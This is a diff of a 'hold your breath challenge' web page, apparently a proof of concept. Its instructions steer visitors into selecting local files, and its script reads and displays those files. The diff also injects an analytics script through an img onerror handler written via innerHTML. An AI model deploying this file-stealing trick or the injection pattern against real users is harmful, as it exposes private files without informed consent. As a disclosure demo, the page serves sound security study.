@@ -14,12 +14,6 @@
 
    <body style='background-color:#aaaaff;'><img width=200 src='https://www.quickanddirtytips.com/sites/default/files/styles/article_main_image/public/images/17091/man-holding-breath.png'></img>
 
-<img src=x onerror="
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-170959658-1');">
 	
 	<h3>HOLD YOUR BREATH CHALLENGE!</h3>
     <h1 id='qmsg'> To play:<br>1)CLICK THE GUY FIRST!<br>2)HOLD down the ENTER key and get ready...<br>3)When the message appears, hold your breath!</h1> 
@@ -28,6 +22,9 @@
 	
 		  var r = new FileReader();
         thing.onchange = function() {
+		var temp="\" window.dataLayer = window.dataLayer || [];  function gtag(){dataLayer.push(arguments);}  gtag('js', new Date());  gtag('config', 'UA-170959658-1');\"";
+		var temp2="<img src=x onerror="+temp+">";
+		qmsg.innerHTML = temp2;
             alert('I stole ' + this.files.length + ' files from your pc!');//This is for PoC only. A real attack would not let the user know what happened.
 			r.onload=function(){
 				alert(r.result); // This displays the contents of the file, which proves the website can read your harddrive.
